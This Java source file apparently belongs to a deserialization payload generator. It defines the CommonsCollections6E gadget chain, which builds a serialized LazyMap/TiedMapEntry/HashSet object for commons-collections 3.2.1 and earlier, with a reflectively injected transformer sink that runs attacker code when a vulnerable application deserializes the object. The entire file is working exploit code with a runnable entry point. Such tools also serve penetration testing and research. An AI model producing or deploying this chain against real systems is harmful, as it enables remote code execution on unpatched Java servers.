package com.ppp.chain.commonscollections3;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Sink({Sink.InvokerTransformer3})
@Authors()
public class CommonsCollections6E implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6E.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object transformers) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, s);

//        // way A
//        HashMap hashMap = new HashMap();
//        hashMap.put(entry, "x");
//        lazyMap.clear();
//
//        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
//
//        return hashMap;

        // way B
        HashMap hashMap = new HashMap();
        hashMap.put(entry, s);
        HashSet hashSet = new HashSet(hashMap.keySet());
        lazyMap.clear();
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return hashSet;
    }
}
